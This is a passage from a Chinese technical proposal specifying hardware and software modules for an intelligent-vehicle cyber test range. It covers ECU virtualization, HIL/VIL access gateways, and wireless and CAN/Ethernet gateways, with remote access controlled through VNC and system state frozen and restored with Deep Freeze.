SSD硬盘，这种固态存储解决方案为模块提供了大量的存储空间以及快速的数据读写能力；</li><li>选用了符合主流标准的4U工业机箱。这种机箱不仅在结构上坚固耐用，能够适应车辆在行驶过程中可能遇到的震动和冲击，而且具备可上架的特性，使得该模块可以方便地安装于标准的电子设备机架中；</li><li>上位机具备与靶场通信的功能，支持靶场试验控制命令接手、执行及状态反馈，这种双向通信机制大大增强了车载以太网接入模块在靶场试验中的应用灵活性和可靠性，为试验提供了强有力的技术支持；</li><li>支持靶场测试状态的开启与关闭，使得测试人员能够对整个测试过程进行更加精确的控制，从而提高测试的可靠性和有效性；</li><li>自动识别并绑定到指定的试验任务上。模块能够在试验准备阶段，通过预设的程序或者网络指令，智能地将自身与特定的试验任务相匹配并进行配置，从而简化了试验流程，减少了人为的配置错误；</li><li>具备对被测件状态进行全面监测和记录的能力，这包括对零部件的网络状况、运行进程状态的实时追踪以及对整个测试过程的结果进行精确采集。模块能够捕捉并记录每一个测试阶段的关键数据，确保了从零部件性能到系统整体表现的各个方面都能被详尽地分析和评估。此外，它还支持自动获取工具测试报告，并将这些宝贵的数据上传至相关的数据管理系统，从而实现数据的集成和共享。</li></ol><h5 id="技术实现内容-23"><a href="#技术实现内容-23" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-9"><a href="#方案-9" class="headerlink" title="方案"></a>方案</h6><p>程控上位机是一种通过计算机软件来控制和监控设备的系统。它通常与设备进行通信，通过计算机的界面和功能，实现对设备的远程控制、参数设置、数据采集和分析等操作。</p><p>程控上位机的功能通常包括以下几个方面：</p><p>1. 远程控制：使用程控上位机可以通过计算机软件来远程控制设备的开关、调节参数等操作，方便用户对设备进行控制。</p><p>2. 参数设置：通过程控上位机可以方便地设置设备的工作参数，如电压、电流、频率等，以满足不同的应用需求。</p><p>3. 数据采集与分析：程控上位机可以实时采集设备产生的数据，并提供数据分析功能，如波形显示、数据统计等，方便用户对实验数据进行分析和处理。</p><p>4. 实验控制与自动化：程控上位机可以通过编程和脚本等方式实现实验的自动化控制，例如自动调节设备参数、记录数据、生成报告等。</p><p>5. 远程监控与故障诊断：程控上位机可以实时监控设备的运行状态，并提供故障诊断功能，帮助用户及时发现和解决设备故障。</p><p>该上位机可与靶场通信的功能，支持靶场试验控制命令接手、执行及状态反馈，控制靶场测试状态的开启与关闭，使自动绑定靶场试验任务，同时支持靶场试验任务的被测件状态采集，测试结果采集，包含零部件网络及进程状态，工具测试报告获取并上传等。</p><p>上位机与靶场之间建立网络连接，并使用合适的通信协议进行数据交换。上位机具备解析靶场试验控制命令的能力，并根据命令内容进行相应的操作。上位机在执行试验控制命令后，需要及时向靶场返回执行结果或状态反馈。上位机具备相应的异常处理和容错机制，应对网络通信异常、命令执行失败情况。</p><p>上位机可以接收来自靶场的指令或信号，通过解析命令或检测信号状态，判断是否需要开启靶场测试状态。上位机可以接收来自靶场的指令或信号，检测是否需要关闭靶场测试状态。上位机在支持靶场测试状态的开启与关闭时，具有异常处理和容错机制。上位机加入权限控制、安全验证机制，限制只有具备合法权限的用户。</p><p>上位机中定义靶场试验任务的相关信息，包括任务名称、任务描述、试验参数等。上位机根据不同的触发条件来自动绑定靶场试验任务。当触发条件满足时，上位机自动将靶场试验任务与相关设备或系统进行绑定，如果任务成功绑定，上位机自动启动任务的执行。</p><p>上位机通过与被测件进行通信，获取其状态信息；监控测试过程中产生的数据和结果；通过网络监测工具或自定义的程序，对靶场试验中涉及的零部件网络和进程进行状态监测。上位机与测试工具进行集成，自动获取工具生成的测试报告。</p><p>总之，程控上位机通过计算机软件的界面和功能，提供了方便、灵活、智能化的设备控制和监控手段，广泛应用于实验室、工业自动化、生产线等领域。</p><h4 id="零部件虚拟化接入模块"><a href="#零部件虚拟化接入模块" class="headerlink" title="零部件虚拟化接入模块"></a>零部件虚拟化接入模块</h4><h5 id="功能实施方案-26"><a href="#功能实施方案-26" class="headerlink" title="功能实施方案"></a>功能实施方案</h5><ol><li>提供了灵活的测试模拟功能，能够支持多种AUTOSAR（AUTomotive Open System ARchitecture）环境下的软件测试。具体来说，该模块能够执行AUTOSAR Classic平台上的纯应用层测试模拟，它可以在不涉及底层硬件的情况下，对上层应用软件进行全面的测试。此外，该模块还支持AUTOSAR Classic和AUTOSAR Adaptive平台包含部分协议栈的测试模拟，这允许开发者在模拟环境中包含必要的通讯协议栈部分，以便更接近实际硬件环境的测试。这些功能使得模块能够适配各种基于AUTOSAR协议的嵌入式软件模拟需求；</li><li>对基础软件（BSW）层的高度仿真能力，实现了对车载软件中最为关键的基础服务层的深度模拟。该模块不仅仅局限于简单的功能复现，而是支持用户对BSW层中的通讯协议、诊断功能、ECU管理（EcuM）、服务映射以及任务映射进行细致的调整和修改。这种仿真能力极大地增强了开发者在软件开发和测试阶段的灵活性，使得他们能够在不依赖于实际硬件的情况下，对软件的基础层进行精确的配置和优化；</li><li>提供了全面的网络模拟功能，允许用户以简便的方式对车辆内部通信网络进行详尽的模拟。这一功能不仅限于模拟现有的网络拓扑，还支持将实际的总线控制器无缝地映射到模拟的网络环境中，确保了模拟环境与实际车辆系统之间的高度一致性。此外，该模块还允许用户将其他网络节点，比如动态链接库（DLL）或是程序集等软件组件，加入到模拟网络之中；</li><li>支持为不同的目标平台提供虚拟被测系统，如主流的Windows、Linux等，通过这样的虚拟化支持，不同平台上的性能差异和操作特性都可以在早期阶段得到充分考虑和测试，从而为最终产品的稳定性和跨平台一致性提供了坚实的基础；</li><li>支持将虚拟的电子控制单元（ECU）转换成可被车载网络测试软件直接调用的模型库，即支持为不同的目标平台提供虚拟被测系统，如主流的Windows、Linux等。此功能极大地简化了虚拟ECU模型的创建和集成流程，允许工程师和开发者迅速构建起符合需求的虚拟ECU模型，并将其无缝地嵌入到复杂的车载网络测试环境中；</li><li>支持将虚拟的ECU实例化为独立的SUT用例。允许虚拟ECU在其自己的进程中进行使用，这一特性使得每个虚拟ECU都能在其独立的进程空间中运行，从而实现了更高的模拟精度和更好的资源隔离；</li><li>支持多种流行的编译器和相应的不同版本来编译虚拟被测系统。具体来说，该模块兼容包括但不限于Visual Studio 2019和Visual Studio 2017在内的编译环境，同时也支持使用CMAKE这一开源的跨平台安装（编译）工具；</li><li>支持QEMU的软件在环SIL套件适配器，实现了与QEMU的无缝集成。这一集成支持了与仿真目标的联合仿真，使得开发者能够在一个统一的环境中模拟和测试虚拟ECU与实际硬件之间的交互。</li><li>将虚拟CAN（控制器局域网）接口，即基于SocketCAN的接口，有效地连接到软件在环（SIL）的CAN总线上。这一功能为模拟复杂的车辆网络通讯提供了便利；</li><li>支持与车载总线测试系统的联合测试，该模块不仅能够独立运行测试程序，而且还能与车载总线测试系统进行高效的交互，共同执行测试任务。</li></ol><h5 id="技术实现内容-24"><a href="#技术实现内容-24" class="headerlink" title="技术实现内容"></a>技术实现内容</h5><h6 id="方案-10"><a href="#方案-10" class="headerlink" title="方案"></a>方案</h6><p>零部件虚拟化技术是一种将车辆零部件转化为虚拟实体的技术。它通过软件模拟和仿真的方式，将实际的硬件零部件虚拟化为虚拟的、可操作的实体，使其在计算机系统中以虚拟的形式存在和运行。</p><p>1. 虚拟化原理：零部件虚拟化技术基于虚拟化原理，利用虚拟机监视器（VMM）或虚拟化层，将物理零部件的功能和特性抽象出来，并在虚拟环境中模拟其行为。这样，软件可以通过虚拟接口与虚拟零部件进行交互，而无需直接访问实际的硬件。</p><p>2. 虚拟化技术应用：零部件虚拟化技术可以应用于多个领域和应用场景。在汽车领域，它可以用于虚拟化车辆的各种电子控制单元（ECU），如发动机控制单元、车身控制单元等。通过虚拟化这些ECU，可以实现更灵活的软件开发、测试和部署，提高系统的可靠性和可维护性。</p><p>3. 软件定义的零部件：零部件虚拟化技术使得零部件可以以软件定义的方式存在。通过虚拟化，可以将多个实际的硬件零部件抽象为一个虚拟零部件，或者将一个实际的硬件零部件分割为多个虚拟零部件。这种软件定义的零部件可以根据需求进行灵活配置和管理，提高系统的可扩展性和适应性。</p><p>4. 功能隔离和安全性：通过零部件虚拟化技术，可以实现不同零部件之间的功能隔离和安全性。虚拟化技术可以将不同的虚拟零部件隔离运行，防止彼此之间的干扰和冲突。同时，虚拟化技术也可以提供安全性措施，保护虚拟零部件的数据和操作免受未经授权的访问和攻击。</p><p>5. 性能和效率：零部件虚拟化技术可以提高系统的性能和效率。通过虚拟化，可以实现对虚拟零部件的资源分配和管理，优化资源利用率，提高系统的运行效率。此外，虚拟化技术还可以实现动态的资源调整和负载均衡，提高系统的可伸缩性和稳定性。</p><p>零部件虚拟化技术通过将车载零部件虚拟化为虚拟实体，提供了更灵活、可扩展和安全的系统设计和管理方式。它在汽车领域和其他领域中有着广泛的应用，为系统开发、测试和部署带来了许多优势。。</p><h1 id="智能汽车网络靶场动态测试接入网关"><a href="#智能汽车网络靶场动态测试接入网关" class="headerlink" title="智能汽车网络靶场动态测试接入网关"></a>智能汽车网络靶场动态测试接入网关</h1><h2 id="技术路线-3"><a href="#技术路线-3" class="headerlink" title="技术路线"></a>技术路线</h2><h3 id="智能汽车网络靶场动态测试接入网关-1"><a href="#智能汽车网络靶场动态测试接入网关-1" class="headerlink" title="智能汽车网络靶场动态测试接入网关"></a>智能汽车网络靶场动态测试接入网关</h3><h4 id="功能实施方案-27"><a href="#功能实施方案-27" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：GLAgateway</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>机箱高度为7U，提供了足够的空间来安装高性能的服务器、网络交换机等设备。同时，设备配备了拉杆和滚轮，使得移动变得更加方便。无论是在数据中心还是办公环境中，用户可以轻松地将设备从一个位置移动到另一个位置，而无需借助其他工具或人力；</li><li>KVM集成显示器及键盘鼠标的设备，可以使用户更加方便地管理和操作多个设备。该设备将KVM开关和显示器、键盘鼠标集成在一起，用户只需通过简单的切换操作，即可在同一个屏幕上实时监控和控制多个设备的运行状态；</li><li>内置了强大的上位机，以满足用户对高性能计算和数据处理的需求。它搭载Intel 4核i5第10代或更新的处理器，确保了卓越的处理速度和响应能力。配备8GB的内存，使得多任务处理和大型应用程序运行更加流畅和高效。同时，存储容量也250GB的SSD，提供了足够的空间来存储大量的数据和文件，并且具备快速的读写速度，加快了数据访问和传输的效率；</li><li>具备统一的电源管理模块，为用户提供了便捷和可靠的电源供应管理。该电源管理模块集成在设备中，将市电供应给设备，防雷、防水等功能，确保设备在不同的环境下都可安全运行。</li><li>这款设备支持仿真测试实验室HIL（Hardware-in-the-Loop）和VIL（Vehicle-in-the-Loop）接入，为用户提供了高效、精准的仿真测试环境。通过将设备与仿真测试系统连接起来，用户可以进行各种测试和验证，包括电路分析、控制算法设计、电子系统模拟等，以及对设备进行性能和可靠性测试；</li><li>这款设备支持多种HIL（Hardware-in-the-Loop）接入方式，包括车身舒适、动力底盘、信息娱乐、网联通信、座舱、ADAS等多个领域，为用户提供了全面的测试和验证环境。通过将设备与各种HIL系统进行连接，用户可以对不同领域的汽车电子零部件集合进行全面的测试和验证，包括控制器、传感器、执行器等各种硬件和软件系统，该设备支持多种HIL接入方式，为用户提供了全面、精确、可靠的测试和验证环境，有助于提高车辆零部件系统产品的性能和可靠性，并促进汽车电子技术的创新和发展；</li><li>提供了HIL和VIL适配开发功能，该设备都提供了全面、灵活、可靠的测试和验证环境。用户可以根据自己的需求和实际情况，选择适合的开发方式，并进行测试控制和状态回读，以加速开发进程、降低成本、提高产品质量。这有助于推动汽车电子技术的创新和发展，满足不断变化的市场需求；</li><li>支持与HIL、VIL上位机软件的通信，该设备为用户提供了更加灵活、可定制的测试和验证环境。用户可以根据自己的需求和实际情况，选择适合的上位机软件，并进行测试控制和状态回读，以满足各种不同的应用场景和需求。这有助于提高测试效率、优化测试方案，并促进汽车电子技术的创新和发展；</li><li>支持交互数据的多种形式，以满足广泛的测试需求。其中包括整车CAN数据和车载以太网数据，用户可以通过设备与整车的CAN总线或车载以太网进行通信，获取和发送各种车辆数据，如车速、转速、油门位置等。这样，用户可以模拟真实的车辆数据，并对车辆电子系统进行全面的测试和验证。支持传感器模拟输入CAN信号的功能。用户可以通过设备模拟各种传感器的输出信号，如雷达、摄像头、激光雷达等，以测试车辆电子系统对不同传感器输入的响应和处理能力。支持仿真场景的天气和道路数据，用户可以设置不同的天气条件，如雨天、雪天、晴天等，以及不同的道路状况，如高速公路、城市道路等。这样，用户可以模拟各种不同的驾驶场景，并对车辆电子系统在不同环境下的性能进行测试和验证。支持ECU仿真供电控制。用户可以通过设备对ECU的供电进行控制，模拟各种供电异常或故障情况，如电压波动、断电等；</li><li>提供了接入网关与HIL、VIL交互协议模板，该设备为用户提供了全面、灵活的数据交互和控制方式。用户可以根据自己的需求和实际情况，选择合适的通信协议和数据格式，并进行定制化配置，以实现系统间的高效、可靠通信和数据交互；</li><li>支持对VIL系统中的光照强度、雨量、雾量、交通标识等参数进行控制，以模拟不同的气候和道路条件。用户可以通过设备提供的接口和控制命令，精确地调节这些参数，以创建各种真实世界的驾驶场景；</li><li>靶场接入控制设计不影响HIL、VIL正常测试工作，通过采用独立的通信通道和接口来实现，并提供灵活的配置和启用/禁用功能。通过并行运行，以确保靶场接入控制不会对HIL和VIL系统的性能和可靠性造成负面影响。通过合理的设计和实施，可以保证靶场接入控制不会影响HIL和VIL正常测试工作的进行，从而提高整个测试流程的效率和准确性。</li></ol><h4 id="技术实现内容-25"><a href="#技术实现内容-25" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>动态测试接入模块选用7U空间的设备。外观应该采用坚固和可靠的结构，并使用耐用的材料制造。外观应该配备拉杆和滚轮，以方便移动。</p><p>动态测试接入模块实现多台计算机共享同一组显示器、键盘和鼠标设备。为了KVM集成显示器及键盘鼠标，集成显示器通常具有内置的KVM交换机功能，可以直接连接多台计算机，选择适用于KVM集成显示器的键盘和鼠标设备。</p><p>动态测试接入模块选择支持Intel 4核i5 10代或更新处理器的主板。确保主板支持8GB内存，并具备足够的插槽和支持频率，以满足系统对内存的需求。选择250GB的SSD存储器，以提供足够的存储空间和快速的数据读写速度。</p><p>动态测试接入模块具备统一的电源管理模块，并将电源分配给相关的硬件组件和外设设备。电源管理模块提供过流保护、过压保护、欠压保护功能，以防止电源异常对系统造成损害。</p><p>动态测试接入模块提供与HIL和VIL设备通信的硬件接口。提供相应的软件驱动程序和API（应用程序接口），以便与HIL和VIL设备进行通信和控制。</p><p>动态测试接入模块提供多种通信接口，以便与不同模块接入HIL设备。</p><p>动态测试接入模块具备HIL/VIL适配开发的能力，即与硬件回环测试平台进行集成。具备VIL适配开发的能力，即与车辆进行集成测试。具备兼容不同HIL和VIL测试平台的能力。</p><p>动态测试接入模块提供与HIL和VIL上位机软件进行通信的接口。在通信接口的基础上，还需要定义相应的通信协议,支持发送测试控制信号给HIL或VIL上位机软件。</p><p>动态测试接入模块整车CAN数据是指车辆各个部件之间通过CAN总线进行通信的数据。为了确保测试车辆的控制系统在各种场景下的响应能力，具备模拟各类传感器的输入信号能力，如整车CAN数据、车载以太网数据、传感器模拟输入CAN信号、仿真场景天气道路数据、ECU仿真供电控制等。</p><p>动态测试接入模块具备接入网关与HIL/VIL交互协议模板。</p><p>动态测试接入模块可调节的光源，可以模拟不同强度的光照条件。控制光源亮度；可以通过调整光源的亮度来控制光照强度。使用喷水系统可以模拟不同程度的雨量。使用雾机或喷雾器在测试场地或驾驶舱周围释放雾气，可以模拟不同浓度和厚度的雾量。使用可变交通标志，可以实现对交通标识的控制。通过与交通标志设备进行连接，并通过远程控制接口发送指令，可以实现对交通标志的控制。</p><p>动态测试接入模块靶场接入控制系统是独立于HIL和VIL系统的，它不应该直接干预或影响这两个测试系统的操作。接入控制系统应该与HIL和VIL系统分开部署，并且有一个独立的控制单元。</p><p>MOV11型移动接入网关是将车载无线通信网关、车载网络通信网关、调试桥网关整合集成到一起的便携式设备。</p><h3 id="车载无线通信网关"><a href="#车载无线通信网关" class="headerlink" title="车载无线通信网关"></a>车载无线通信网关</h3><h4 id="功能实施方案-28"><a href="#功能实施方案-28" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>产品信息如下：</p><p>品牌：国利</p><p>型号：R4000</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>★具备多项功能以支持实车无线接口的测试和管理。支持将实车无线接口接入本地或异地联邦靶场进行测试，为用户提供更灵活的测试环境选择。支持对上位机访问权限进行控制，用户可以配置权限，例如桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等，以确保安全性和控制范围。支持操作画面监控和录屏功能，方便用户进行实时监控和记录测试过程。提供上位机系统状态的冻结与启动还原功能，确保测试环境的一致性和稳定性。在配置冻结与还原时，需要进行访问控制，以保证数据和系统的安全性。通过这些功能的支持，用户可以更加便捷地管理和测试实车无线接口，提高测试效率和准确性。详细说明见“产品功能截图”部分；</li><li>具备可移动性，方便进行外场测试。可以轻松携带，适用于各种不同的测试场景，并支持快速部署和拆卸。可以随时将它携带到任何地点进行测试和管理，无需担心安装和使用的问题；</li><li>支持2.4G和5G双频，以及广泛应用的802.11a/b/g/n/ac无线网络协议。可以在不同频段下进行测试，并能够适配多种无线设备和网络环境。通过支持2.4G和5G双频，提供了更大的频谱范围，可以更好地适应不同的无线信道环境，减少干扰和提高传输速率。同时，支持802.11a/b/g/n/ac协议，它可以与各种符合这些协议的设备进行兼容和通信；</li><li>每套接入模块都支持2个适配器，并且每个适配器都配备了一根天线。可以提供更强的信号接收和传输能力，确保在测试过程中能够获得稳定的无线连接。通过每个模块支持两个适配器，可以同时进行多路测试或者在不同频段下进行测试，以满足不同场景和需求的要求；</li><li>支持AP模式和STA模式，以满足不同的测试需求和应用场景。在AP模式中，设备提供无线接入和桥接功能，允许其他设备连接到它上面，从而构建一个无线局域网，在STA模式下，可以作为一个普通的无线用户，连接到其他无线接入点或路由器上；</li><li>该方案不仅支持标准蓝牙协议，还支持低功率蓝牙协议。标准蓝牙协议适用于传输音频、图像和其他大容量数据的应用场景，而低功率蓝牙协议则专注于低功耗和短距离通信，适用于物联网设备和传感器等功耗敏感的应用；</li><li>每套接入模块都支持2个适配器，并且每个适配器都配备了一根天线。可以提供更强的信号接收和传输能力，确保在测试过程中能够获得稳定的无线连接。通过每个模块支持两个适配器，可以同时进行多路测试或者在不同频段下进行测试，以满足不同场景和需求的要求；</li><li>支持实车无线电信号接入，这是一种关键的测试需求，可以为汽车制造商和无线设备供应商提供更准确、可靠的测试结果。在实车无线电信号接入测试中，可以通过安装适配器和天线来获取车载无线电信号，并将其传输到测试仪器上进行分析和测试。</li></ol><h4 id="性能实施方案-7"><a href="#性能实施方案-7" class="headerlink" title="性能实施方案"></a>性能实施方案</h4><ol><li>采用5dB全向天线，可以保证接入信号的质量。更卓越的信号覆盖性能、更稳定的连接和更快的数据传输速度，为实车无线接入测试提供了更可靠、更高效的无线连接体验。</li></ol><h4 id="产品功能截图"><a href="#产品功能截图" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ul><li>支持将实车无线接口接入本地或异地联邦靶场进行测试；支持从靶场对上位机访问权限控制至少桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；支持操作画面监控与录屏；支持上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制；</li></ul><p><strong>靶场对上位机的访问权限控制通过VNC Server实现：</strong></p><p>VNC（Virtual Network Computing）是一种远程桌面协议，可以实现远程控制和访问计算机的图形界面。通过使用VNC，在一台计算机上远程控制另一台计算机，并进行桌面浏览、键盘输入、鼠标输入、文件拷贝、文件传输等操作。</p><p>在使用VNC时，权限控制可以通过以下方式进行配置：</p><p>VNC服务器设置密码：在VNC服务器上设置密码，只有知道密码的用户才能连接和控制该计算机。</p><p>VNC服务器访问控制：VNC服务器通常提供一些配置选项，可以限制特定IP地址或网络的访问。根据需要配置允许或拒绝的IP地址范围。</p><p>VNC服务器权限配置：某些VNC服务器软件提供更细粒度的权限配置选项，允许您为不同的用户或用户组设置不同的权限级别。这样，控制用户能够执行的操作，例如是否允许复制拷贝文本、文件传输等。</p><p><strong>上位机系统状态冻结与启动还原通过冰点还原实现；</strong></p><p>冰点还原是一种系统管理软件，可以实现系统状态的冻结和启动还原。它可以在计算机重启后恢复系统到事先设定的状态，从而保护系统免受恶意软件、配置更改或其他意外事件的影响。</p><p>使用冰点还原时，系统状态冻结和启动还原的工作流程如下：</p><p>冻结系统状态：在冰点还原软件中，选择将系统状态冻结为一个基准状态。在这个基准状态下，任何对系统的更改（例如安装软件、修改配置、添加文件等）都将被忽略。</p><p>系统运行时状态：在冻结状态下，自由地使用计算机并进行各种操作，例如安装软件、更改配置、存储文件等。这些更改只会在当前会话中生效，并不会对系统的基准状态产生影响。</p><p>启动还原：当您重启计算机时，冰点还原会将系统恢复到冻结状态下的基准状态。任何在冻结状态下进行的更改都会被清除，系统将回到冻结状态所代表的原始状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c1020c0cb0d411a72503715a6ee7e82b.png"></p><p>（VNC权限控制界面）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ddb7f429c8992c8c17e7f161ced39a7.png"></p><p>（冰点还原）</p><h4 id="技术实现内容-26"><a href="#技术实现内容-26" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>R4000车载无线通讯网关是一种实现车辆内部与外部无线通信的设备或系统。它支持多种无线通信技术，实现车辆与移动网络和车载设备之间的数据传输和互联网接入。车载无线通讯网关具有安全性、远程控制和管理等功能，为车辆提供了丰富的车联网应用和服务。</p><p>车载无线通讯网关适用于外场测试，便携可移动，支持2.4G和5G双频，支持802.11a/b/g/n/ac协议。</p><p>车载无线通讯网关配置2个适配器，配置2个适配器，且配置一根天线（选用5db全向天线），具备AP模式和STA模式。既支持低功率蓝牙，又支持标准蓝牙协议。具备接入实车无线电信号功能。</p><h3 id="车载网络通信网关"><a href="#车载网络通信网关" class="headerlink" title="车载网络通信网关"></a>车载网络通信网关</h3><h4 id="功能实施方案-29"><a href="#功能实施方案-29" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>该产品信息如下：</p><p>品牌：国利</p><p>型号：VBE</p><p>数量：7套</p><p>指标参数信息如下：</p><ol><li>具备多项功能以支持实车无线接口的测试和管理。支持将实车无线接口接入本地或异地联邦靶场进行测试，为用户提供更灵活的测试环境选择。支持对上位机访问权限进行控制，用户可以配置权限，例如桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等，以确保安全性和控制范围。支持操作画面监控和录屏功能，方便用户进行实时监控和记录测试过程。提供上位机系统状态的冻结与启动还原功能，确保测试环境的一致性和稳定性。在配置冻结与还原时，需要进行访问控制，以保证数据和系统的安全性。通过这些功能的支持，用户可以更加便捷地管理和测试实车无线接口，提高测试效率和准确性。详细说明见“产品功能截图”部分；</li><li>具备可移动性，方便进行外场测试。可以轻松携带，适用于各种不同的测试场景，并支持快速部署和拆卸。可以随时将它携带到任何地点进行测试和管理，无需担心安装和使用的问题；</li><li>支持LIN协议和CAN协议，还支持CANFD扩展协议，可以与车辆的LIN总线和CAN总线进行通信，并且能够适应高速、大容量的CANFD数据传输需求，支持将接入的CAN节点通过socketCAN与靶场虚拟环境中的CAN节点进行通信。socketCAN是Linux下的一种实现了套接字接口的CAN驱动，它允许在Linux系统中通过套接字编程的方式对CAN总线进行控制和通信。通过与靶场虚拟环境中的CAN节点进行通信，可以模拟不同的CAN网络拓扑结构和通信场景，从而更全面地测试和验证车辆的CAN系统功能和性能；</li><li>支持4路车载CAN或者LIN总线接入的能力。可以同时连接到车辆的四个CAN或LIN总线，提供多通道的接入功能。通过这种方式，可以同时监测和控制车辆上多个CAN或LIN总线的通信，实现对整个车辆的全面测试和分析；</li><li>支持1000M和100M车载以太网的能力。可以与车辆的以太网接口进行连接，并提供高速的网络通信能力；</li><li>支持DoIP和SOME/IP协议的能力。可以与车辆的DoIP和SOME/IP网络进行连接，并支持这些协议的数据传输和处理，对于DoIP网络，可以实现诊断数据的传输和处理，对车辆的诊断系统进行测试和评估。对于SOME/IP网络，可以实现车辆上各个ECU之间的通信和互操作，对车辆的软件和系统进行测试和验证；</li><li>支持4路车载以太网接入，可以实现对车辆各个系统的并行测试和评估。可以同时监测车辆的电动系统、信息娱乐系统、安全系统等多个系统的数据传输和处理情况，提高测试效率和准确性。</li></ol><h4 id="产品功能截图-1"><a href="#产品功能截图-1" class="headerlink" title="产品功能截图"></a>产品功能截图</h4><ul><li>支持将实车无线接口接入本地或异地联邦靶场进行测试；支持从靶场对上位机访问权限控制至少桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；支持操作画面监控与录屏；支持上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制；</li></ul><p><strong>靶场对上位机的访问权限控制通过VNC Server实现：</strong></p><p>VNC（Virtual Network Computing）是一种远程桌面协议，可以实现远程控制和访问计算机的图形界面。通过使用VNC，在一台计算机上远程控制另一台计算机，并进行桌面浏览、键盘输入、鼠标输入、文件传输等操作。</p><p>在使用VNC时，权限控制可以通过以下方式进行配置：</p><p>VNC服务器设置密码：在VNC服务器上设置密码，只有知道密码的用户才能连接和控制该计算机。</p><p>VNC服务器访问控制：VNC服务器通常提供一些配置选项，可以限制特定IP地址或网络的访问。根据需要配置允许或拒绝的IP地址范围。</p><p>VNC服务器权限配置：某些VNC服务器软件提供更细粒度的权限配置选项，允许您为不同的用户或用户组设置不同的权限级别。这样，控制用户能够执行的操作，例如是否允许复制拷贝文本、文件传输等。</p><p><strong>上位机系统状态冻结与启动还原通过冰点还原实现；</strong></p><p>冰点还原是一种系统管理软件，可以实现系统状态的冻结和启动还原。它可以在计算机重启后恢复系统到事先设定的状态，从而保护系统免受恶意软件、配置更改或其他意外事件的影响。</p><p>使用冰点还原时，系统状态冻结和启动还原的工作流程如下：</p><p>冻结系统状态：在冰点还原软件中，选择将系统状态冻结为一个基准状态。在这个基准状态下，任何对系统的更改（例如安装软件、修改配置、添加文件等）都将被忽略。</p><p>系统运行时状态：在冻结状态下，自由地使用计算机并进行各种操作，例如安装软件、更改配置、存储文件等。这些更改只会在当前会话中生效，并不会对系统的基准状态产生影响。</p><p>启动还原：当您重启计算机时，冰点还原会将系统恢复到冻结状态下的基准状态。任何在冻结状态下进行的更改都会被清除，系统将回到冻结状态所代表的原始状态。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/c1020c0cb0d411a72503715a6ee7e82b.png"></p><p>（VNC权限控制界面）</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="https://focu5.oss-accelerate.aliyuncs.com/media/9ddb7f429c8992c8c17e7f161ced39a7.png"></p><p>（冰点还原）</p><h4 id="技术实现内容-27"><a href="#技术实现内容-27" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><p>VBE车载网络通信网关是一种用于在车辆中实现网络通信的设备或系统。它充当车辆内部网络与外部网络之间的连接点，实现车辆与互联网的连接和数据传输；通过VNC及冰点还原实现从靶场对上位机访问权限控制，包含桌面浏览、远程键盘输入、远程鼠标输入、复制拷贝文本、文件传输等权限配置；同时支持操作画面监控与录屏；以及上位机系统状态冻结与启动还原，冻结与还原配置需要访问控制</p><p>网络通信：确保实车无线接口与本地或异地联邦靶场之间能够建立稳定、安全的网络连接。可以使用安全加密协议进行数据传输，采用防火墙和入侵检测系统等安全设备来保护通信链路。</p><p>访问权限控制：在靶场端设置权限控制机制，可以对上位机访问进行权限配置。包括桌面浏览权限、远程键盘输入权限、远程鼠标输入权限、复制拷贝文本权限、文件传输权限等。这样可以根据实际需要进行灵活的权限管理，确保只有经授权的人员才能进行相应的操作。</p><p>操作画面监控与录屏：在联邦靶场端设置监控和录屏功能，监控上位机的操作画面，并记录下相关操作过程。这样可以提供后续分析和回放，确保测试过程的可追溯性和安全性。</p><p>系统状态冻结与启动还原：设计针对上位机系统的状态冻结与启动还原功能，确保在进行测试前能够将系统状态冻结，以便后续还原测试环境。同时，对于这些冻结与还原配置，需要进行访问控制，确保只有人员才能进行相关操作。</p><p>车载设备的结构设计：车载网络通信设备需要具备轻量化、紧凑型的结构设计，以便于携带和安装。可以采用模块化设计，将主要功能模块集成在一个小型机箱内，便于携带和部署。</p><p>电源供应和电池管理：为了保证设备的移动性，需要考虑电源供应和电池管理。可以配置适量容量的可充电电池，并设计合理的能耗管理机制，以延长设备的使用时间。同时，可以预留外部电源接口，以便在需要时进行外部电源供应。</p><p>网络连接和无线技术支持：为了便于外场测试，设备需要支持多种网络连接方式，例如4G/5G移动网络、Wi-Fi等，以满足不同测试环境下的网络需求。此外，还需要支持不同的无线技术标准，以适应各种测试场景。</p><p>防护和抗干扰设计：外场测试环境通常存在各种不确定因素，例如恶劣天气、强烈干扰等。为了保护设备的正常运行和数据传输，可以在设备外壳上添加防水、防尘、抗震等保护措施，并采用抗干扰的设计方案，以减少外界干扰对设备性能的影响。</p><p>远程管理和监控：为了方便外场测试的管理和维护，可以考虑添加远程管理和监控功能。通过远程管理系统，可以实时查看设备状态、进行配置调整、收集测试数据等操作，以提高测试效率和便利性。</p><p>协议支持：首先，需要在车载网络通信设备中集成相应的硬件接口和软件功能，以支持LIN协议、CAN协议和CANFD扩展协议。这些协议可以通过相关的芯片或模块来实现，例如LIN控制器芯片、CAN控制器芯片等。</p><p>驱动程序和协议栈：为了使车载网络通信设备能够与接入的CAN节点进行通信，需要开发相应的驱动程序和协议栈。驱动程序负责与硬件接口进行通信，而协议栈则负责解析和封装L